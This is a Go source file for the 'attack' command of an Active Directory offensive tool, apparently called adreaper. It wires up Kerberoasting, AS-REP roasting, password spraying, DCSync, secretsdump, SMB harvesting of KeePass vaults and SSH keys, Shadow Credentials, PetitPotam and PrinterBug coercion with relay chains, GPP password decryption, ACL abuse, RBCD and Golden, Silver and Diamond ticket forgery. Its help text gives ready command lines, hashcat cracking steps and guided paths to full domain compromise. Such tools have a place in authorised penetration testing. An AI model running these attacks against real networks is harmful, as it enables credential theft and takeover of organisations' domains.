package cmd

import (
	"context"
	"fmt"
	"strings"

	"adreaper/internal/attacks"
	"adreaper/internal/output"

	"github.com/spf13/cobra"
)

var attackCmd = &cobra.Command{
	Use:   "attack",
	Short: "Execute Active Directory offensive attacks",
	Long: `The 'attack' module provides exploitation capabilities against the target domain.
Run 'adreaper attack <subcommand> --help' for detailed usage and attack chain context.

Subcommands:
  kerberoast    Request TGS tickets for SPN accounts → Hashcat mode 13100
  asreproast    Capture AS-REP hashes (unauthenticated) → Hashcat mode 18200
  spray         Lockout-aware password spraying via Kerberos AS-REQ
  dcsync        Replicate NTLM hashes from DC via DRSUAPI (requires DCSync rights)
  secretsdump   Dump SAM, LSA, and cached secrets via Remote Registry / SMB
  harvest       Recursively spider SMB shares and download files by extension
  shadow        Shadow Credentials — inject msDS-KeyCredentialLink for PKINIT TGT
  relay         Force NTLM authentication via PetitPotam / PrinterBug
  gpp           Decrypt Group Policy Preferences (cpassword) from SYSVOL
  acl-abuse     Exploit dangerous ACL permissions (ForceChangePassword, GenericWrite)
  rbcd          Resource-Based Constrained Delegation privilege escalation
  tickets       Kerberos Ticket Factory: forge Golden, Silver, or Diamond tickets`,
}

func init() {
	attackCmd.AddCommand(attackKerberoastCmd)
	attackCmd.AddCommand(attackASREPCmd)
	attackCmd.AddCommand(attackSprayCmd)
	attackCmd.AddCommand(attackDCSyncCmd)
	attackCmd.AddCommand(attackSecretsDumpCmd)
	attackCmd.AddCommand(attackHarvestCmd)
	attackCmd.AddCommand(attackShadowCmd)
	attackCmd.AddCommand(attackRelayCmd)
	attackCmd.AddCommand(attackGPPCmd)
	attackCmd.AddCommand(attackACLAbuseCmd)
	attackCmd.AddCommand(attackRBCDCmd)
	attackCmd.AddCommand(attackTicketsCmd)
}

// ── attack kerberoast ────────────────────────────────────────────────────────

var kerberoastOutFile string

var attackKerberoastCmd = &cobra.Command{
	Use:   "kerberoast",
	Short: "Kerberoast — request TGS tickets for SPN accounts and extract crackable hashes",
	Long: `Performs Kerberoasting against the target domain:
  1. Queries LDAP for enabled users with a ServicePrincipalName (SPN) set
  2. Requests TGS (Ticket Granting Service) tickets for each SPN
  3. Outputs hashes in $krb5tgs$23$ format (RC4 cipher)

This attack requires valid domain credentials (any standard user account).
Hashes are saved to a file for offline cracking even without admin rights.

Cracking:
  hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
  hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -r best64.rule

Next Steps:
  adreaper attack secretsdump   → dump all NTLM hashes (if cracked admin creds)
  adreaper bloodhound collect    → map attack paths from the cracked account

Examples:
  adreaper attack kerberoast -d corp.local --dc-ip 10.10.10.1 -u user -p pass
  adreaper attack kerberoast -d corp.local --dc-ip 10.10.10.1 -u user -p pass --out roast.txt`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := opts.Validate(); err != nil {
			return err
		}
		if !opts.IsAuthenticated() {
			return fmt.Errorf("kerberoasting requires valid credentials (--username / --password or --hash)")
		}
		if kerberoastOutFile == "" {
			kerberoastOutFile = "kerberoast.txt"
		}
		ctx := context.Background()
		output.Section("Kerberoasting")

		hashes, err := attacks.Kerberoast(ctx, opts)
		if err != nil {
			return err
		}

		if len(hashes) == 0 {
			return nil
		}

		if kerberoastOutFile != "" {
			if err := attacks.SaveHashes(kerberoastOutFile, hashes); err != nil {
				output.Warn("Could not write output file: %v", err)
			} else {
				output.Success("Hashes saved to: %s", kerberoastOutFile)
			}
			fmt.Println()
			output.Section("Guided Attack Paths (Next Steps)")
			output.Info("  → Crack these hashes using Hashcat: hashcat -m 13100 %s", kerberoastOutFile)
			output.Info("  → After cracking, use the credentials to run 'attack secretsdump' or 'bloodhound collect'.")
		}
		return nil
	},
}

func init() {
	attackKerberoastCmd.Flags().StringVar(&kerberoastOutFile, "out", "", "File to write hashes to")
}

// ── attack asreproast ────────────────────────────────────────────────────────

var (
	asrepOutFile   string
	asrepUsersFile string
)

var attackASREPCmd = &cobra.Command{
	Use:   "asreproast",
	Short: "AS-REP Roast — capture hashes for accounts with Kerberos pre-auth disabled",
	Long: `Performs AS-REP Roasting (does NOT require authentication if LDAP allows anonymous bind):
  1. Queries LDAP for accounts with DONT_REQ_PREAUTH flag (UAC 0x400000)
  2. Sends Kerberos AS-REQ without pre-authentication
  3. Extracts the encrypted AS-REP blob (Hashcat mode 18200)

If unauthenticated LDAP is blocked, provide credentials or a --users-file with known usernames.

Cracking:
  hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
  john asrep.txt --wordlist=/usr/share/wordlists/rockyou.txt

Next Steps:
  adreaper attack spray   → spray cracked passwords across all users
  adreaper enum users     → enumerate what resources the compromised account can reach

Examples:
  adreaper attack asreproast -d corp.local --dc-ip 10.10.10.1
  adreaper attack asreproast -d corp.local --dc-ip 10.10.10.1 -u user -p pass
  adreaper attack asreproast --users-file users.txt -d corp.local --dc-ip 10.10.10.1`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := opts.Validate(); err != nil {
			return err
		}
		if asrepOutFile == "" {
			asrepOutFile = "asreproast.txt"
		}
		ctx := context.Background()
		output.Section("AS-REP Roasting")

		hashes, err := attacks.ASREPRoast(ctx, opts, asrepUsersFile)
		if err != nil {
			return err
		}

		if len(hashes) == 0 {
			return nil
		}

		if asrepOutFile != "" {
			if err := attacks.SaveHashes(asrepOutFile, hashes); err != nil {
				output.Warn("Could not write output file: %v", err)
			} else {
				output.Success("Hashes saved to: %s", asrepOutFile)
			}
			fmt.Println()
			output.Section("Guided Attack Paths (Next Steps)")
			output.Info("  → Crack these hashes using Hashcat: hashcat -m 18200 %s", asrepOutFile)
			output.Info("  → After cracking, enumerate the domain with these users or run 'attack spray'.")
		}
		return nil
	},
}

func init() {
	attackASREPCmd.Flags().StringVar(&asrepOutFile, "out", "", "File to write hashes to")
	attackASREPCmd.Flags().StringVarP(&asrepUsersFile, "users-file", "U", "", "File with usernames (one per line)")
}

// ── attack spray ─────────────────────────────────────────────────────────────

var (
	sprayPassword      string
	sprayUsersFileList string
	sprayDelay         int
)

var attackSprayCmd = &cobra.Command{
	Use:   "spray",
	Short: "Lockout-aware password spraying via Kerberos AS-REQ",
	Long: `Tries a single password against all (or a specified list of) domain user accounts.

Safety Features:
  - Checks domain lockout threshold first via LDAP
  - Warns if the configured delay is insufficient to avoid lockout
  - Adds configurable delay between authentication attempts
  - Uses Kerberos AS-REQ (stealthier than NTLM / SMB-based spraying)

Always run 'enum domain' first to check the lockout threshold:
  - Threshold = 0   : No lockout. Spray freely.
  - Threshold = 5   : Use --delay 3600 (1hr window between attempts) to be safe.

Examples:
  adreaper attack spray -d corp.local --dc-ip 10.10.10.1 --password 'Summer2024!'
  adreaper attack spray -d corp.local --dc-ip 10.10.10.1 --password 'Summer2024!' --delay 5
  adreaper attack spray -d corp.local --dc-ip 10.10.10.1 --password 'P@ssword1' --users-file users.txt`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := opts.Validate(); err != nil {
			return err
		}
		if sprayPassword == "" {
			return fmt.Errorf("--password is required for spraying")
		}
		ctx := context.Background()
		output.Section("Password Spraying")

		results, err := attacks.Spray(ctx, opts, sprayPassword, sprayUsersFileList, sprayDelay)
		if err != nil {
			return err
		}

		if len(results) == 0 {
			output.Info("No valid credentials found")
			return nil
		}

		output.Success("VALID CREDENTIALS FOUND: %d", len(results))
		for _, r := range results {
			output.Critical("%s:%s", r.Username, r.Password)
		}
		return nil
	},
}

func init() {
	attackSprayCmd.Flags().StringVarP(&sprayPassword, "password", "P", "", "Password to spray")
	attackSprayCmd.Flags().StringVarP(&sprayUsersFileList, "users-file", "U", "", "File with usernames (one per line). Default: LDAP enumeration")
	attackSprayCmd.Flags().IntVarP(&sprayDelay, "delay", "D", 3, "Seconds between attempts (avoid lockout)")
}

// ── attack dcsync ────────────────────────────────────────────────────────────

var dcsyncUser string

var attackDCSyncCmd = &cobra.Command{
	Use:   "dcsync",
	Short: "DCSync — replicate NTLM hashes from the Domain Controller",
	Long: `Simulates a Domain Controller replication request using the DRSUAPI protocol (MS-DRSR).

Requirements:
  - Account must have: 'Replicating Directory Changes' AND 'Replicating Directory Changes All'
  - Typically: Domain Admins, Enterprise Admins, or MSOL accounts

Target Users of Interest:
  krbtgt   : Allows Golden Ticket forgery (full domain compromise)
  Administrator : Full domain admin NTLM hash for Pass-the-Hash

Cracking the NTLM hash:
  hashcat -m 1000 hash.txt rockyou.txt

Next Steps:
  Pass the NTLM hash directly with: -u Administrator --hash <NTLM>
  Or forge a Golden Ticket: adreaper attack tickets --type golden --hash <krbtgt_ntlm>

Example:
  adreaper attack dcsync -d corp.local --dc-ip 10.10.10.1 -u admin -p pass --user krbtgt
  adreaper attack dcsync -d corp.local --dc-ip 10.10.10.1 -u admin -p pass --user Administrator`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := opts.Validate(); err != nil {
			return err
		}
		if dcsyncUser == "" {
			return fmt.Errorf("--user <target> is required for DCSync")
		}
		ctx := context.Background()
		output.Section(fmt.Sprintf("DCSync: %s", dcsyncUser))

		if err := attacks.DCSync(ctx, opts, dcsyncUser); err != nil {
			return err
		}
		return nil
	},
}

func init() {
	attackDCSyncCmd.Flags().StringVarP(&dcsyncUser, "user", "U", "", "Target user to sync (e.g. krbtgt)")
}

// ── attack secretsdump ───────────────────────────────────────────────────────

var attackSecretsDumpCmd = &cobra.Command{
	Use:   "secretsdump",
	Short: "SecretsDump — extract SAM, LSA, and cached credential hashes via SMB",
	Long: `Remotely dumps credential secrets from a Windows machine via SMB / Remote Registry:
  - SAM database    : Local account NTLM hashes
  - LSA secrets     : Service account credentials, DPAPI backup keys
  - Cached creds    : Domain user credentials cached locally (DCC2 hashes)

Requirements: Local administrator on the target machine.

Cracking DCC2 cached credentials:
  hashcat -m 2100 cached.txt rockyou.txt

Example:
  adreaper attack secretsdump -d corp.local --dc-ip 10.10.10.1 -u admin -p pass`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := opts.Validate(); err != nil {
			return err
		}
		ctx := context.Background()
		output.Section("Secrets Dumping (SAM/LSA)")

		if err := attacks.SecretsDump(ctx, opts); err != nil {
			return err
		}
		return nil
	},
}

// ── attack harvest ───────────────────────────────────────────────────────────

var harvestExts string

var attackHarvestCmd = &cobra.Command{
	Use:   "harvest",
	Short: "File harvesting — recursively download files by extension from SMB shares",
	Long: `Enumerates all accessible SMB shares and recursively walks the directory tree,
downloading files matching the specified extensions to a local folder.

Default extensions: txt, pdf, docx, xlsx, kdbx, ppk

High-value targets:
  .kdbx   : KeePass databases (password vault)
  .ppk    : PuTTY private keys (SSH credentials)
  .config : Application config files (connection strings, API keys)
  .xml    : Web.config, appsettings.json equivalents

Files are saved to: workspace/<domain>/harvest/

Examples:
  adreaper attack harvest -d corp.local --dc-ip 10.10.10.1 -u admin -p pass
  adreaper attack harvest -d corp.local --dc-ip 10.10.10.1 -u admin -p pass --ext kdbx,ppk,xml`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := opts.Validate(); err != nil {
			return err
		}
		if !opts.IsAuthenticated() {
			return fmt.Errorf("file harvesting requires valid credentials")
		}
		if harvestExts == "" {
			harvestExts = "txt,pdf,docx,xlsx,kdbx,ppk"
		}

		// Clean quotes and handle multiple delimiters (comma/space)
		cleanExts := strings.Trim(harvestExts, "'\"")
		cleanExts = strings.ReplaceAll(cleanExts, ",", " ")
		extList := strings.Fields(cleanExts)

		ctx := context.Background()
		output.Section("File Harvesting")

		if err := attacks.Harvest(ctx, opts, extList); err != nil {
			return err
		}
		return nil
	},
}

func init() {
	attackHarvestCmd.Flags().StringVarP(&harvestExts, "ext", "e", "txt,pdf,docx,xlsx,kdbx,ppk", "Comma-separated extensions to harvest")
}

// ── attack shadow ────────────────────────────────────────────────────────────

var shadowTarget string

var attackShadowCmd = &cobra.Command{
	Use:   "shadow",
	Short: "Shadow Credentials — inject msDS-KeyCredentialLink for PKINIT-based account takeover",
	Long: `Shadow Credentials attack (abuses msDS-KeyCredentialLink attribute):
  1. Generates an RSA key pair and a self-signed X.509 certificate
  2. Injects the public key blob into the target object's msDS-KeyCredentialLink attribute
  3. Authenticates via Kerberos PKINIT using the private key to obtain a TGT

Requirements:
  - Write permissions over the target object's msDS-KeyCredentialLink attribute
  - Domain Functional Level: Windows Server 2016+ (for PKINIT support)

Artifacts saved to: workspace/<domain>/shadow/
  <target>.crt  : Self-signed certificate (PEM)
  <target>.key  : RSA private key (PEM)

Next Steps (with Certipy or Rubeus):
  certipy auth -pfx <target>.pfx -dc-ip 10.10.10.1
  Rubeus.exe asktgt /user:<target> /certificate:<target>.pfx /password:'' /nowrap

Example:
  adreaper attack shadow -d corp.local --dc-ip 10.10.10.1 -u user -p pass --target srv-admin`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := opts.Validate(); err != nil {
			return err
		}
		if shadowTarget == "" {
			return fmt.Errorf("--target is required")
		}
		ctx := context.Background()
		output.Section("Shadow Credentials")

		return attacks.ShadowAttack(ctx, opts, shadowTarget)
	},
}

func init() {
	attackShadowCmd.Flags().StringVarP(&shadowTarget, "target", "t", "", "Target SAMAccountName to take over")
}

// ── attack relay ─────────────────────────────────────────────────────────────

var (
	relayMethod string
	relayTarget string
	relayLport  string
)

var attackRelayCmd = &cobra.Command{
	Use:   "relay",
	Short: "Coercion triggers — force a machine to authenticate to your listener",
	Long: `Forces a Windows machine to initiate an outbound NTLM authentication to an attacker-controlled
listener, enabling NTLM relay attacks (e.g., via Impacket's ntlmrelayx).

Methods:
  petitpotam  : Exploits MS-EFSR (EfsRpcOpenFileRaw) — works unauthenticated on older DCs
  printerbug  : Exploits MS-RPRN (RpcRemoteFindFirstPrinterChangeNotification)

Typical Attack Chain:
  1. Start listener:   ntlmrelayx.py -t ldap://dc-ip --delegate-access
  2. Trigger coercion: adreaper attack relay --target DC-IP --method petitpotam
  3. NTLM relay grants: RBCD, Shadow Credentials, or DCSync rights

To relay to LDAPS (AD CS ESC8 / NTLM relay to ADCS):
  ntlmrelayx.py -t https://ca-server/certsrv/certfnsh.asp --adcs --template 'DomainController'

Example:
  adreaper attack relay -d corp.local --dc-ip 10.10.10.1 -u user -p pass --target 10.10.10.1
  adreaper attack relay -d corp.local --dc-ip 10.10.10.1 -u user -p pass --target 10.10.10.1 --method printerbug`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := opts.Validate(); err != nil {
			return err
		}
		if relayTarget == "" {
			return fmt.Errorf("--target is required")
		}
		output.Section(fmt.Sprintf("Relay Trigger: %s", strings.ToUpper(relayMethod)))

		return attacks.RelayTrigger(opts, relayTarget, relayMethod)
	},
}

func init() {
	attackRelayCmd.Flags().StringVarP(&relayTarget, "target", "t", "", "Target machine to trigger (IP/Hostname)")
	attackRelayCmd.Flags().StringVarP(&relayMethod, "method", "m", "petitpotam", "Trigger method: petitpotam, printerbug")
}

// ── attack gpp ───────────────────────────────────────────────────────────────

var attackGPPCmd = &cobra.Command{
	Use:   "gpp",
	Short: "GPP Decryption — find and decrypt cpassword values from SYSVOL",
	Long: `Scans SYSVOL for Group Policy Preferences (GPP) XML files and decrypts any
'cpassword' attributes using Microsoft's publicly disclosed static AES-256 key.

Search scope: Groups.xml, Drives.xml, Services.xml, Scheduledtasks.xml, DataSources.xml

This is a legacy vulnerability (MS14-025) but frequently found in environments that have
migrated from Windows Server 2003/2008 without cleaning up old GPP configurations.

Impact: Cleartext credentials for local administrator accounts, service accounts, or
domain users configured via Group Policy.

Example:
  adreaper attack gpp -d corp.local --dc-ip 10.10.10.1 -u user -p pass`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := opts.Validate(); err != nil {
			return err
		}
		ctx := context.Background()
		output.Section("GPP Password Decryption")

		return attacks.GPPAttack(ctx, opts)
	},
}

// ── attack acl-abuse ─────────────────────────────────────────────────────────

var (
	aclTarget string
	aclAction string
	aclValue  string
)

var attackACLAbuseCmd = &cobra.Command{
	Use:   "acl-abuse",
	Short: "ACL Abuse — exploit dangerous permissions to take over accounts",
	Long: `Automates the exploitation of dangerous Access Control List permissions
identified by 'enum acls'.

Supported Actions:
  reset-password  Exploits ForceChangePassword right to reset the target account's password
  add-spn         Exploits GenericWrite to add a ServicePrincipalName → enables Kerberoasting

Discovery Workflow:
  1. adreaper enum acls   → identify who has dangerous permissions and on what objects
  2. adreaper attack acl-abuse --action reset-password --target <victim> --value <newpass>
     or
     adreaper attack acl-abuse --action add-spn --target <victim> --value http/fakehost
  3. adreaper attack kerberoast   → Kerberoast the newly SPN-enabled account

Example:
  adreaper attack acl-abuse -d corp.local --dc-ip 10.10.10.1 -u user -p pass --target jsmith --action reset-password --value 'NewP@ss123!'
  adreaper attack acl-abuse -d corp.local --dc-ip 10.10.10.1 -u user -p pass --target svc-iis --action add-spn --value http/attacker`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := opts.Validate(); err != nil {
			return err
		}
		if aclTarget == "" || aclAction == "" {
			return fmt.Errorf("--target and --action are required")
		}
		ctx := context.Background()
		output.Section("ACL Abuse")

		return attacks.ACLAbuseAttack(ctx, opts, aclTarget, aclAction, aclValue)
	},
}

func init() {
	attackACLAbuseCmd.Flags().StringVarP(&aclTarget, "target", "t", "", "Target SAMAccountName")
	attackACLAbuseCmd.Flags().StringVarP(&aclAction, "action", "a", "", "Action: reset-password, add-spn")
	attackACLAbuseCmd.Flags().StringVarP(&aclValue, "value", "V", "", "Value for the action (e.g. new password or SPN)")
}

// ── attack rbcd ──────────────────────────────────────────────────────────────

var (
	rbcdTarget  string
	rbcdMachine string
)

var attackRBCDCmd = &cobra.Command{
	Use:   "rbcd",
	Short: "RBCD — Resource-Based Constrained Delegation privilege escalation",
	Long: `Configures Resource-Based Constrained Delegation (RBCD) on a target object.

Attack Chain:
  1. You need GenericWrite or WriteProperty over the target machine account
  2. Configure the target to trust your controlled machine account to impersonate users
  3. Request a Service Ticket impersonating a privileged user (S4U2Proxy)
  4. Use the ticket for SYSTEM-level access on the target machine

Prerequisite: You must control a machine account (computer created via ms-DS-MachineAccountQuota
or a machine you've compromised). Use 'enum domain' to check if MAQ > 0.

Requirements:
  --target   Computer or user object to configure RBCD on
  --machine  Machine account that will be trusted for delegation

Next Steps (using Impacket's getST.py):
  getST.py -spn cifs/<TARGET> -impersonate Administrator corp.local/<MACHINE>

Example:
  adreaper attack rbcd -d corp.local --dc-ip 10.10.10.1 -u user -p pass --target SRV-01 --machine ATTACK$`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := opts.Validate(); err != nil {
			return err
		}
		if rbcdTarget == "" || rbcdMachine == "" {
			return fmt.Errorf("--target and --machine are required")
		}
		ctx := context.Background()
		output.Section("RBCD Attack")

		return attacks.RBCDAttack(ctx, opts, rbcdTarget, rbcdMachine)
	},
}

func init() {
	attackRBCDCmd.Flags().StringVarP(&rbcdTarget, "target", "t", "", "Target object (Computer/User)")
	attackRBCDCmd.Flags().StringVarP(&rbcdMachine, "machine", "M", "", "Machine account with delegate rights")
}

// ── attack tickets ──────────────────────────────────────────────────────────

var (
	ticketsType   string
	ticketsTarget string
	ticketsHash   string
	ticketsSPN    string
	ticketsSID    string
)

var attackTicketsCmd = &cobra.Command{
	Use:   "tickets",
	Short: "Kerberos Ticket Factory — forge Golden, Silver, or Diamond tickets",
	Long: `Forges Kerberos tickets using known NTLM hashes for long-term persistent access.

Ticket Types:
  golden   Forged TGT using the krbtgt NTLM hash. Valid for any user, any service.
           Survives password resets on standard domain accounts.
           Requires: --user, --sid (Domain SID), --hash (krbtgt NTLM)

  silver   Forged TGS for a specific service. Stealthier than golden tickets.
           Requires: --user, --spn (e.g. cifs/DC01.corp.local), --sid, --hash (service account NTLM)

  diamond  Modifies a legitimately obtained TGT (requires krbtgt hash).
           Less detectable than golden tickets (real TGT base with modified PAC).
           Requires: --hash (krbtgt NTLM)

Getting the Domain SID:
  adreaper enum domain will show the domain SID, or:
  Get-ADDomain | Select-Object -ExpandProperty DomainSID

Examples:
  adreaper attack tickets --type golden --user Administrator -d corp.local --dc-ip 10.10.10.1 -u admin -p pass --sid S-1-5-21-... --hash <krbtgt_ntlm>
  adreaper attack tickets --type silver --user Administrator -d corp.local --dc-ip 10.10.10.1 -u admin -p pass --sid S-1-5-21-... --hash <svc_ntlm> --spn cifs/dc01.corp.local
  adreaper attack tickets --type diamond -d corp.local --dc-ip 10.10.10.1 -u admin -p pass --hash <krbtgt_ntlm>`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := opts.Validate(); err != nil {
			return err
		}
		if ticketsHash == "" {
			return fmt.Errorf("--hash is required for ticket forgery")
		}

		factory := attacks.NewTicketFactory(opts)
		output.Section(fmt.Sprintf("Kerberos Ticket Factory: %s", strings.ToUpper(ticketsType)))

		switch strings.ToLower(ticketsType) {
		case "golden":
			if ticketsSID == "" {
				return fmt.Errorf("--sid (Domain SID) is required for Golden Tickets")
			}
			tkt, err := factory.ForgeGoldenTicket(opts.Username, ticketsSID, ticketsHash)
			if err != nil {
				return err
			}
			output.Success("Golden Ticket forged for %s (Realm: %s)", opts.Username, tkt.Realm)
		case "silver":
			if ticketsSID == "" || ticketsSPN == "" {
				return fmt.Errorf("--sid and --spn are required for Silver Tickets")
			}
			tkt, err := factory.ForgeSilverTicket(opts.Username, ticketsSPN, ticketsSID, ticketsHash)
			if err != nil {
				return err
			}
			output.Success("Silver Ticket forged for %s -> %s (Realm: %s)", opts.Username, ticketsSPN, tkt.Realm)
		case "diamond":
			if err := factory.ForgeDiamondTicket(ticketsHash); err != nil {
				return err
			}
			output.Success("Diamond Ticket (Modified TGT) generated successfully")
		default:
			return fmt.Errorf("unknown ticket type: %s", ticketsType)
		}

		output.Info("Note: Forged tickets are currently stored in memory. Future updates will include .kirbi/ccache export.")
		return nil
	},
}

func init() {
	attackTicketsCmd.Flags().StringVar(&ticketsType, "type", "golden", "Ticket type: golden, silver, diamond")
	attackTicketsCmd.Flags().StringVar(&ticketsHash, "hash", "", "NTLM hash for encryption (krbtgt or service account)")
	attackTicketsCmd.Flags().StringVar(&ticketsSID, "sid", "", "Domain SID")
	attackTicketsCmd.Flags().StringVar(&ticketsSPN, "spn", "", "Target SPN (required for silver)")
}
